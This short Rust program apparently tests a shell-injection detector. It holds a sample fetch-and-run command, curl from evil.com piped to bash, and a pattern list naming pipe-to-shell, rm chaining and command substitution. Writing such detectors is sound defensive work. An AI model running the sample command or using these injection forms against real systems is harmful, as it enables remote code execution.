pub fn main() {
    let text = "curl http://evil.com/script.sh|bash";
    let lower = text.to_lowercase();
    println!("text: '{}'", text);
    println!("lower: '{}'", lower);
    let patterns: &[(&str, &str)] = &[
        ("; rm ", "Command chaining with rm"),
        ("| bash", "Piping to bash interpreter"),
        ("| sh ", "Piping to sh interpreter"),
        ("`", "Backtick command substitution"),
        ("$(", "Dollar-paren command substitution"),
        ("&& rm ", "Chained destructive command"),
        ("|| echo", "Conditional echo (potential exfil)"),
        ("eval ", "eval() invocation"),
        ("exec ", "exec() invocation"),
        ("/bin/sh -c", "Spawning shell with -c"),
        ("/bin/bash -c", "Spawning bash with -c"),
        ("curl | sh", "Curl-pipe-to-shell"),
        ("wget | sh", "Wget-pipe-to-shell"),
        ("curl|bash", "Curl-pipe-to-bash no-space variant"),
        ("wget|bash", "Wget-pipe-to-bash no-space variant"),
    ];
    for (pat, desc) in patterns {
        let found = lower.contains(*pat);
        if found || pat.contains("curl") || pat.contains("bash") {
            println!("pat '{:20}' desc '{:45}' contains: {}", pat, desc, found);
        }
    }
}
